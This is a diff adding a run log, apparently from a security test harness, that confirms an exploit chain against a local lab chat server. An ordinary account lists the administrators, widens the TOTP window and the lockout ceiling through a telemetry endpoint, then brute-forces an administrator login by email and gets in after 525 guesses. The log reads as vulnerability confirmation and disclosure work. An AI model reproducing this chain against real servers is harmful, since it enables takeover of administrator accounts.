@@ -1,0 +1,26 @@
+========================================================================
+CHAIN-002: an ordinary account widens the TOTP window, then guesses into an administrator
+target : http://127.0.0.1:39649
+author : Blue Spider
+========================================================================
+[INFO] chaining VULN-007 (the roster, with roles and addresses) -> VULN-057 (statistics.telemetry writes the 2FA window and the per-address lockout) -> VULN-032 (a login by email address is never locked out)
+[SETUP] victim sadm_9f359e8a is an administrator with TOTP enrolled (the attacker holds its password, not its codes)
+[SETUP] attacker atk_9f359e8a registered through the public form (role: user)
+[SETUP] shipped values recorded for the restore: {"Accounts_TwoFactorAuthentication_MaxDelta": 1, "Block_Multiple_Failed_Logins_Attempts_Until_Block_By_Ip": 50}
+[STEP] 1/3 VULN-007: users.listByStatus as the ordinary attacker, filtered to admins
+[PROOF]     HTTP 200: 2 administrator(s) with their addresses, from an account with no permissions: [('admin', 'admin@lab.invalid', ['admin']), ('sadm_9f359e8a', 'sadm_9f359e8a@lab.invalid', ['admin', 'user'])]
+[STEP] 2/3 VULN-057: statistics.telemetry -> Accounts_TwoFactorAuthentication_MaxDelta + 4000, Block_Multiple_Failed_Logins_Attempts_Until_Block_By_Ip + 1500
+[PROOF]     4000 + 1500 increments accepted (last HTTP 200/200); the workspace now reports Accounts_TwoFactorAuthentication_MaxDelta=4001 (was 1) and Block_Multiple_Failed_Logins_Attempts_Until_Block_By_Ip=1550 (was 50)
+[INFO]     a random six-digit code now verifies with probability 0.8003% (speakeasy window=4001), so the expected grind is about 124 attempts
+[STEP] 3/3 VULN-032: guessing codes at POST /api/v1/login as sadm_9f359e8a@lab.invalid (email form: the per-user block reads the username as typed)
+[INFO]     100 codes guessed, answers so far {"totp-invalid": 100}, 34s elapsed
+[INFO]     200 codes guessed, answers so far {"totp-invalid": 200}, 74s elapsed
+[INFO]     300 codes guessed, answers so far {"totp-invalid": 300}, 115s elapsed
+[INFO]     400 codes guessed, answers so far {"totp-invalid": 400}, 154s elapsed
+[INFO]     500 codes guessed, answers so far {"totp-invalid": 500}, 194s elapsed
+[PROOF]     525 guesses in 202s: answers {"totp-invalid": 524, "": 1}; a guessed code was accepted=True; any attempt refused by a lockout=False
+[PROOF]     the guessed session is sadm_9f359e8a and reads a private setting (HTTP 200), which the attacker's own ordinary account cannot (HTTP 403)
+[INFO] cleanup: restoring both settings to their shipped values and removing the accounts this run created
+[INFO]     settings restored: {"Accounts_TwoFactorAuthentication_MaxDelta": 1, "Block_Multiple_Failed_Logins_Attempts_Until_Block_By_Ip": 50}
+[OK] CHAIN-002 CONFIRMED
+==> CHAIN-002 CONFIRMED 2026-11-24 - an account from the public registration form read the administrators out of users.listByStatus, raised the TOTP window to 4001 and the per-address failed-login ceiling to 1550 through statistics.telemetry, and logged in to the TOTP-protected administrator with a guessed code after 525 attempts, never once locked out
